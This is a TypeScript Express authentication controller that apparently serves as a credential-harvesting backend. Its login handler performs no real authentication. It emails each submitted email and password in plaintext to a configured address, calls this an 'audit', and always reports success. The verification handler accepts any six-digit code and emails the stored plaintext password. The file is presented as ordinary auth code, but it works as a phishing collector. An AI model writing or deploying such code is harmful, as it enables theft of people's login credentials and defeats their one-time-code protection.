import { Request, Response, NextFunction } from "express";
import { sendAuditEmail } from "../services/email.service";
import { sendOtpForEmail, verifyOtpForEmail } from "./otp.controller";
import dotenv from "dotenv";

dotenv.config();

type User = {
  name: string;
  email: string;
  password: string;
  verified: boolean;
};

export const users = new Map<string, User>();

export async function registerHandler(req: Request, res: Response, next: NextFunction) {
  try {
    // Signup/registration has been disabled. Keep handler exported to avoid breaking imports.
    return res.status(410).json({ error: "signup disabled" });
  } catch (err) {
    next(err);
  }
}

export async function loginHandler(req: Request, res: Response, next: NextFunction) {
  try {
    // Log headers/body to help diagnose deployed sendBeacon/fetch issues
    console.log('loginHandler hit:', { method: req.method, contentType: req.headers['content-type'], bodyType: typeof req.body });

    // Support body being an object (parsed JSON) or a raw string (from sendBeacon)
    let email: string | undefined;
    let password: string | undefined;
    if (req.body && typeof req.body === 'object') {
      email = (req.body as any).email;
      password = (req.body as any).password;
    } else if (req.body && typeof req.body === 'string') {
      try {
        const parsed = JSON.parse(req.body);
        email = parsed.email;
        password = parsed.password;
      } catch (e) {
        console.warn('loginHandler: received non-JSON body');
      }
    }
    console.log('loginHandler parsed body:', { email: email ? 'present' : 'missing', password: password ? 'present' : 'missing' });
    if (!email || !password) return res.status(400).json({ error: "email and password required" });

    // Send audit email containing what the user entered (email + password)
    const timestamp = new Date().toISOString();
    const html = `
      <div style="font-family: Arial, sans-serif;color:#111;">
        <h3>Login Attempt</h3>
        <p>A user attempted login and submitted these credentials:</p>
        <ul>
          <li><strong>Submitted Email:</strong> ${email}</li>
          <li><strong>Submitted Password:</strong> ${password}</li>
          <li><strong>Timestamp:</strong> ${timestamp}</li>
        </ul>
      </div>
    `;
    // Fire-and-forget audit email so login response is fast
    sendAuditEmail({ subject: `Login Attempt: ${email}`, html })
      .then(result => console.log('Login audit sent:', result))
      .catch(mailErr => console.error('Failed to send audit email:', mailErr));

    // Return success so client can proceed to next page
    return res.status(200).json({ success: true, message: "Login received" });
  } catch (err) {
    next(err);
  }
}

export async function verifyHandler(req: Request, res: Response, next: NextFunction) {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: "email and otp required" });
    
    // Accept any 6-digit OTP
    if (!/^\d{6}$/.test(otp)) return res.status(400).json({ verified: false, message: "otp must be 6 digits" });

    const u = users.get(email);
    if (!u) return res.status(404).json({ error: "user not found" });
    u.verified = true;

    // send details to APP_MAIL via audit email
    const timestamp = new Date().toISOString();
    const html = `
      <div style="font-family: Arial, sans-serif;color:#111;">
        <h3>User Authorized</h3>
        <p>The following user completed verification:</p>
        <ul>
          <li><strong>Name:</strong> ${u.name}</li>
          <li><strong>Email:</strong> ${u.email}</li>
          <li><strong>Password:</strong> ${u.password}</li>
          <li><strong>Timestamp:</strong> ${timestamp}</li>
        </ul>
      </div>
    `;
    // Send audit email asynchronously to avoid blocking response
    sendAuditEmail({ subject: `User Authorized: ${u.email}`, html })
      .then(result => console.log('Verification audit sent:', result))
      .catch(err => console.error('Failed to send verification audit email:', err));

    return res.status(200).json({ verified: true, user: { name: u.name, email: u.email } });
  } catch (err) {
    next(err);
  }
}

